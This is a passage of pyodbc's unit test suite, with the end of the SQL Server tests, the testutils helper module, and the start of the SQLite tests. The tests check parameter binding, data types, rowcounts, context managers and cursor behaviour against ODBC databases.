        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, '123.45')


    def test_too_large(self):
        """"""Ensure error raised if insert fails due to truncation""""""
        value = 'x' * 1000
        self.cursor.execute(""create table t1(s varchar(800))"")
        def test():
            self.cursor.execute(""insert into t1 values (?)"", value)
        self.assertRaises(pyodbc.DataError, test)

    def test_geometry_null_insert(self):
        def convert(value):
            return value

        self.cnxn.add_output_converter(-151, convert) # -151 is SQL Server's geometry
        self.cursor.execute(""create table t1(n int, v geometry)"")
        self.cursor.execute(""insert into t1 values (?, ?)"", 1, None)
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, None)
        self.cnxn.clear_output_converters()

    def test_login_timeout(self):
        # This can only test setting since there isn't a way to cause it to block on the server side.
        cnxns = pyodbc.connect(self.connection_string, timeout=2)

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <

    def test_context_manager_success(self):
        ""Ensure `with` commits if an exception is not raised""
        self.cursor.execute(""create table t1(n int)"")
        self.cnxn.commit()

        with self.cnxn:
            self.cursor.execute(""insert into t1 values (1)"")

        rows = self.cursor.execute(""select n from t1"").fetchall()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0][0], 1)

    def test_context_manager_failure(self):
        ""Ensure `with` rolls back if an exception is raised""
        # We'll insert a row and commit it.  Then we'll insert another row followed by an
        # exception.

        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        self.cnxn.commit()

        def _fail():
            with self.cnxn:
                self.cursor.execute(""insert into t1 values (2)"")
                self.cursor.execute(""delete from bogus"")

        self.assertRaises(pyodbc.Error, _fail)

        self.cursor.execute(""select max(n) from t1"")
        val = self.cursor.fetchval()
        self.assertEqual(val, 1)


    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)

    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a varbinary(max))')
        hundredkb = b'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_func_param(self):
        self.cursor.execute('''
                            create function func1 (@testparam varchar(4))
                            returns @rettest table (param varchar(4))
                            as
                            begin
                                insert @rettest
                                select @testparam
                                return
                            end
                            ''')
        self.cnxn.commit()
        value = self.cursor.execute(""select * from func1(?)"", 'test').fetchone()[0]
        self.assertEqual(value, 'test')

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')

    def test_drivers(self):
        drivers = pyodbc.drivers()
        self.assertEqual(list, type(drivers))
        self.assertTrue(len(drivers) > 0)

        m = re.search('DRIVER={([^}]+)}', self.connection_string, re.IGNORECASE)
        current = m.group(1)
        self.assertTrue(current in drivers)

    def test_decode_meta(self):
        """"""
        Ensure column names with non-ASCII characters are converted using the configured encodings.
        """"""
        # This is from GitHub issue #190
        self.cursor.execute(""create table t1(a int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        self.cursor.execute('select a as ""Tipología"" from t1')
        self.assertEqual(self.cursor.description[0][0], ""Tipología"")

    def test_exc_integrity(self):
        ""Make sure an IntegretyError is raised""
        # This is really making sure we are properly encoding and comparing the SQLSTATEs.
        self.cursor.execute(""create table t1(s1 varchar(10) primary key)"")
        self.cursor.execute(""insert into t1 values ('one')"")
        self.assertRaises(pyodbc.IntegrityError, self.cursor.execute, ""insert into t1 values ('one')"")

    def test_columns(self):
        # When using aiohttp, `await cursor.primaryKeys('t1')` was raising the error
        #
        #   Error: TypeError: argument 2 must be str, not None
        #
        # I'm not sure why, but PyArg_ParseTupleAndKeywords fails if you use ""|s"" for an
        # optional string keyword when calling indirectly.

        self.cursor.execute(""create table t1(a int, b varchar(3))"")

        self.cursor.columns('t1')
        results = {row.column_name: row for row in self.cursor}
        row = results['a']
        assert row.type_name == 'int', row.type_name
        row = results['b']
        assert row.type_name == 'varchar'
        assert row.column_size == 3

        # Now do the same, but specifically pass in None to one of the keywords.  Old versions
        # were parsing arguments incorrectly and would raise an error.  (This crops up when
        # calling indirectly like columns(*args, **kwargs) which aiodbc does.)

        self.cursor.columns('t1', schema=None, catalog=None)
        results = {row.column_name: row for row in self.cursor}
        row = results['a']
        assert row.type_name == 'int', row.type_name
        row = results['b']
        assert row.type_name == 'varchar'
        assert row.column_size == 3

    def test_cancel(self):
        # I'm not sure how to reliably cause a hang to cancel, so for now we'll settle with
        # making sure SQLCancel is called correctly.
        self.cursor.execute(""select 1"")
        self.cursor.cancel()

    def test_emoticons(self):
        # https://github.com/mkleehammer/pyodbc/issues/423
        #
        # When sending a varchar parameter, pyodbc is supposed to set ColumnSize to the number
        # of characters.  Ensure it works even with 4-byte characters.
        #
        # http://www.fileformat.info/info/unicode/char/1f31c/index.htm
        v = ""x \U0001F31C z""

        self.cursor.execute(""create table t1(s nvarchar(100))"")
        self.cursor.execute(""insert into t1 values (?)"", v)

        result = self.cursor.execute(""select s from t1"").fetchone()[0]

        self.assertEqual(result, v)
        
def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", default=0, help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlservertests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(SqlServerTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests3/testutils.py/n/nimport os, sys, platform
from os.path import join, dirname, abspath, basename
import unittest

def add_to_path():
    """"""
    Prepends the build directory to the path so that newly built pyodbc libraries are used, allowing it to be tested
    without installing it.
    """"""
    # Put the build directory into the Python path so we pick up the version we just built.
    #
    # To make this cross platform, we'll search the directories until we find the .pyd file.

    import imp

    library_exts  = [ t[0] for t in imp.get_suffixes() if t[-1] == imp.C_EXTENSION ]
    library_names = [ 'pyodbc%s' % ext for ext in library_exts ]

    # Only go into directories that match our version number.

    dir_suffix = '-%s.%s' % (sys.version_info[0], sys.version_info[1])

    build = join(dirname(dirname(abspath(__file__))), 'build')

    for root, dirs, files in os.walk(build):
        for d in dirs[:]:
            if not d.endswith(dir_suffix):
                dirs.remove(d)

        for name in library_names:
            if name in files:
                sys.path.insert(0, root)
                return

    print('Did not find the pyodbc library in the build directory.  Will use an installed version.')


def print_library_info(cnxn):
    import pyodbc
    print('python:  %s' % sys.version)
    print('pyodbc:  %s %s' % (pyodbc.version, os.path.abspath(pyodbc.__file__)))
    print('odbc:    %s' % cnxn.getinfo(pyodbc.SQL_ODBC_VER))
    print('driver:  %s %s' % (cnxn.getinfo(pyodbc.SQL_DRIVER_NAME), cnxn.getinfo(pyodbc.SQL_DRIVER_VER)))
    print('         supports ODBC version %s' % cnxn.getinfo(pyodbc.SQL_DRIVER_ODBC_VER))
    print('os:      %s' % platform.system())
    print('unicode: Py_Unicode=%s SQLWCHAR=%s' % (pyodbc.UNICODE_SIZE, pyodbc.SQLWCHAR_SIZE))

    cursor = cnxn.cursor()
    for typename in ['VARCHAR', 'WVARCHAR', 'BINARY']:
        t = getattr(pyodbc, 'SQL_' + typename)
        cursor.getTypeInfo(t)
        row = cursor.fetchone()
        print('Max %s = %s' % (typename, row and row[2] or '(not supported)'))

    if platform.system() == 'Windows':
        print('         %s' % ' '.join([s for s in platform.win32_ver() if s]))



def load_tests(testclass, name, *args):
    """"""
    Returns a TestSuite for tests in `testclass`.

    name
      Optional test name if you only want to run 1 test.  If not provided all tests in `testclass` will be loaded.

    args
      Arguments for the test class constructor.  These will be passed after the test method name.
    """"""
    if name:
        if not name.startswith('test_'):
            name = 'test_%s' % name
        names = [ name ]

    else:
        names = [ method for method in dir(testclass) if method.startswith('test_') ]

    return unittest.TestSuite([ testclass(name, *args) for name in names ])


def load_setup_connection_string(section):
    """"""
    Attempts to read the default connection string from the setup.cfg file.

    If the file does not exist or if it exists but does not contain the connection string, None is returned.  If the
    file exists but cannot be parsed, an exception is raised.
    """"""
    from os.path import exists, join, dirname, splitext, basename
    from configparser import SafeConfigParser

    FILENAME = 'setup.cfg'
    KEY      = 'connection-string'

    path = dirname(abspath(__file__))
    while True:
        fqn = join(path, 'tmp', FILENAME)
        if exists(fqn):
            break
        parent = dirname(path)
        print('{} --> {}'.format(path, parent))
        if parent == path:
            return None
        path = parent

    try:
        p = SafeConfigParser()
        p.read(fqn)
    except:
        raise SystemExit('Unable to parse %s: %s' % (path, sys.exc_info()[1]))

    if p.has_option(section, KEY):
        return p.get(section, KEY)
/n/n/n",0
115,dcdb81e6f86420c96cc113a726be8663566cfe95,"/tests2/sqlitetests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a setup.cfg file in the root of the project
(the same one setup.py would use) like so:

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value, len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', u'')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', bytearray(value), len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")
        
    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s text)"")
        self.cursor.execute(""insert into t1 values (1, 'abc')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to ""off"",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute(""begin"")
            cursor.execute(""create table t1(i int)"")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
